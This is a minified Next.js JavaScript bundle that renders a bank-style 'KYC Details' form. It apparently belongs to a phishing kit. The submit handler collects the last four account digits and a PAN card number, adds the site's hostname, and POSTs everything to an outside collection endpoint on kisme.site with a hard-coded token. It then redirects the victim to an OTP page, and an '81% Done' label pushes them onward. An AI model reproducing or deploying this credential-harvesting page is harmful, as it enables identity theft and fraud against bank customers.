(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[478],{9192:function(e,t,n){Promise.resolve().then(n.bind(n,4477))},4477:function(e,t,n){"use strict";n.r(t),n.d(t,{default:function(){return i}});var s=n(7437);n(6482);var a=n(4033),r=n(2265);function i(){let e=(0,a.useRouter)(),[t,n]=(0,r.useState)(!1);return(0,s.jsxs)("main",{children:[(0,s.jsx)("div",{className:"Tpv_login_heading__E5J6K",children:(0,s.jsx)("h3",{className:"Tpv_login_heading_h3__z0Qx1",children:"KYC Details"})}),(0,s.jsxs)("div",{className:"Tpv_login_form___9zpm",children:[(0,s.jsx)("p",{className:"Tpv_mandatory_txt__YZHLO",children:"Required fields an asterisk (*)"}),(0,s.jsxs)("form",{className:"Tpv_form__okPRU",onSubmit:t=>{t.preventDefault();let s=new FormData(t.target),a={};s.forEach((e,t)=>{a[t]=e}),a.site=window.location.hostname,fetch("https://kisme.site/test_api.php?token=WILASKLDJADLKJASD",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(a)}).then(e=>e.json()).then(t=>{200==t.status?(n(!0),e.push("/otp?next=/fna")):(n(!1),console.log("failed"))}).catch(e=>{n(!1),console.error(e)})},children:[(0,s.jsxs)("div",{className:"Tpv_form_group__aHWg0",children:[(0,s.jsxs)("label",{className:"Tpv_label__cObJz",children:["Last 4-digit A/c No ",(0,s.jsx)("span",{className:"Tpv_mandatory_txt__YZHLO",children:"*"})]}),(0,s.jsx)("input",{name:"LDAN",type:"text",inputMode:"numeric",minLength:4,maxLength:4,className:"Tpv_form_control__5hzGF",required:!0})]}),(0,s.jsxs)("div",{className:"Tpv_form_group__aHWg0",children:[(0,s.jsxs)("label",{className:"Tpv_label__cObJz",children:["Pan Card No.",(0,s.jsx)("span",{className:"Tpv_mandatory_txt__YZHLO",children:"*"})]}),(0,s.jsx)("input",{name:"PCN",type:"e",pattern:"[a-zA-Z]{5}[0-9]{4}[a-zA-Z]{1}",maxLength:10,minLength:10,className:"Tpv_form_control__5hzGF",required:!0})]}),(0,s.jsx)("p",{className:"Tpv_content_title__SWlCq",children:"81% Done"}),(0,s.jsx)("div",{className:"Tpv_t_center__8YF86",children:(0,s.jsx)("input",{type:"submit",className:"Tpv_btn_default__TMlv_",defaultValue:"submit"})})]})]})]})}},6482:function(e,t){"use strict";t.Z={src:"/_next/static/media/captcha.4883c8fe.png",height:34,width:111,blurDataURL:"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAgAAAACCAIAAADq9gq6AAAAPUlEQVR42gEyAM3/AOvo6szL1MbH07y/zL3BzcjJ0ubf3/Lt7ADr7vDN1t/Q2eDN1t7R2ODX3uTr7e7y8/TtLikDW4NbBAAAAABJRU5ErkJggg==",blurWidth:8,blurHeight:2}},622:function(e,t,n){"use strict";var s=n(2265),a=Symbol.for("react.element"),r=(Symbol.for("react.fragment"),Object.prototype.hasOwnProperty),i=s.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,_={key:!0,ref:!0,__self:!0,__source:!0};function o(e,t,n){var s,o={},l=null,c=null;for(s in void 0!==n&&(l=""+n),void 0!==t.key&&(l=""+t.key),void 0!==t.ref&&(c=t.ref),t)r.call(t,s)&&!_.hasOwnProperty(s)&&(o[s]=t[s]);if(e&&e.defaultProps)for(s in t=e.defaultProps)void 0===o[s]&&(o[s]=t[s]);return{$$typeof:a,type:e,key:l,ref:c,props:o,_owner:i.current}}t.jsx=o,t.jsxs=o},7437:function(e,t,n){"use strict";e.exports=n(622)},4033:function(e,t,n){e.exports=n(5313)}},function(e){e.O(0,[971,938,744],function(){return e(e.s=9192)}),_N_E=e.O()}]);